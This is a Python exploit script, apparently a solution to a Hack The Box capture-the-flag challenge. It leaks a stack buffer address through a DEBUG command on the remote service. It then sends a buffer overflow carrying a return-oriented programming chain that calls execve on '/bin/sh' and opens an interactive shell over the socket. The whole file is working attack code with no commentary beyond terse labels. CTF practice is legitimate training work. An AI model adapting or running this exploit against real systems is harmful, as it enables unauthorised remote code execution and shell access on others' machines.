import socket 
import telnetlib
import struct

HOST = "docker.hackthebox.eu"
PORT = 36198
BIN_SH_OFFSET = 216+88
SIZE_BETWEEN_BUF = 0xe0

scl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
scl.connect((HOST, PORT))

print(scl.recv(1024))

scl.sendall(b'DEBUG\n')

msg = scl.recv(1024)
curr_address = msg[25:25+14].decode('latin-1') #only get the hex part
curr_address = int(curr_address,16)

next_buf_addr = curr_address - SIZE_BETWEEN_BUF
bin_sh_addr = next_buf_addr + BIN_SH_OFFSET

print("[*] Current Buffer address : {}".format(hex(curr_address)))
print("[*] Next Buffer address : {}".format(hex(next_buf_addr)))
print("[*] Next /bin/sh address : {}".format(hex(bin_sh_addr)))


payload = b'a'*216
payload += b'\x2b\x14\x40'+b'\x00'*5 # pop rdi addr
payload += struct.pack("<Q",bin_sh_addr) # address of "/bin/sh"

payload += b'\x29\x14\x40'+b'\x00'*5 # pop rsi addr
payload += b'\x00'*16 #rsi = 0 ; r15 = 0 (both are 8 bytes)

payload += b'\x62\x11\x40'+b'\x00'*5 # pop rax addr
payload += b'\x3b'+b'\x00'*7 #0x3b -> execve syscall

payload += b'\x64\x11\x40'+b'\x00'*5 # pop rdx addr
payload += b'\x00'*16 #rdx = 0 ; r13 = 0 (both are 8 bytes)

payload += b'\x68\x11\x40'+b'\x00'*5 # syscall
payload += b'/bin/bash\x00\n'

print("[*] Length of payload : {} bytes".format(len(payload)))

print("[*] Sending exploit payload...")

scl.sendall(payload)

t = telnetlib.Telnet()
t.sock = scl
t.interact()

scl.close()